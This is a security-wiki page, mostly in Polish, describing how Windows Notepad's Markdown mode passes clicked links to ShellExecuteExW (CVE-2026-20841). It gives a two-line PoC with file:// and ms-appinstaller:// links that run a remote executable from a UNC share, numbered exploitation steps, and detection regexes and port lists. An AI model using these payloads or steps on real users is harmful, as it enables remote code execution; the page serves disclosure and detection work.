# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Nowoczesne aplikacje Windows, które renderują Markdown/HTML, często zamieniają podawane przez użytkownika linki w elementy klikalne i przekazują je do `ShellExecuteExW`. Bez ścisłego allowlistingu schematów, dowolny zarejestrowany handler protokołu (np. `file:`, `ms-appinstaller:`) może zostać wywołany, prowadząc do wykonania kodu w kontekście bieżącego użytkownika.

## ShellExecuteExW surface in Windows Notepad Markdown mode
- Notepad wybiera tryb Markdown **tylko dla rozszerzeń `.md`** za pomocą stałego porównania łańcuchów w `sub_1400ED5D0()`.
- Obsługiwane linki Markdown:
- Standardowy: `[text](target)`
- Autolink: `<target>` (renderowany jako `[target](target)`), więc obie składnie mają znaczenie dla payloads i detekcji.
- Kliknięcia linków są przetwarzane w `sub_140170F60()`, która wykonuje słabe filtrowanie, a następnie wywołuje `ShellExecuteExW`.
- `ShellExecuteExW` przekazuje obsługę do **dowolnego skonfigurowanego handlera protokołu**, nie tylko HTTP(S).

### Payload considerations
- Wszystkie sekwencje `\\` w linku są **normalizowane do `\`** przed `ShellExecuteExW`, co wpływa na tworzenie UNC/ścieżek i detekcję.
- Pliki `.md` **nie są domyślnie skojarzone z Notepad**; ofiara nadal musi otworzyć plik w Notepad i kliknąć link, ale po wyrenderowaniu link jest klikalny.
- Przykładowe niebezpieczne schematy:
- `file://` do uruchomienia lokalnego/UNC payloadu.
- `ms-appinstaller://` do uruchomienia przepływów App Installer. Inne lokalnie zarejestrowane schematy również mogą być nadużyte.

### Minimalny PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Przebieg eksploatacji
1. Sporządź **`.md` plik** tak, aby Notepad renderował go jako Markdown.
2. Osadź link używając niebezpiecznego schematu URI (`file:`, `ms-appinstaller:`, or any installed handler).
3. Dostarcz plik (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB or similar) i przekonaj użytkownika, aby otworzył go w Notepad.
4. Po kliknięciu, **znormalizowany link** jest przekazywany do `ShellExecuteExW` i odpowiadający protocol handler wykonuje odwołaną treść w kontekście użytkownika.

## Pomysły na wykrywanie
- Monitoruj transfery plików `.md` przez porty/protokoły, które zwykle dostarczają dokumenty: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Parsuj linki Markdown (standardowe i autolink) i szukaj **niezależnego od wielkości liter** `file:` lub `ms-appinstaller:`.
- Wyrażenia regularne zalecane przez dostawców do wykrywania dostępu do zasobów zdalnych:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Zachowanie łatki rzekomo **umieszcza na białej liście lokalne pliki i HTTP(S)**; wszystko inne trafiające do `ShellExecuteExW` jest podejrzane. Rozszerz wykrywania na inne zainstalowane obsługiwacze protokołów w razie potrzeby, ponieważ powierzchnia ataku różni się między systemami.

## References
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
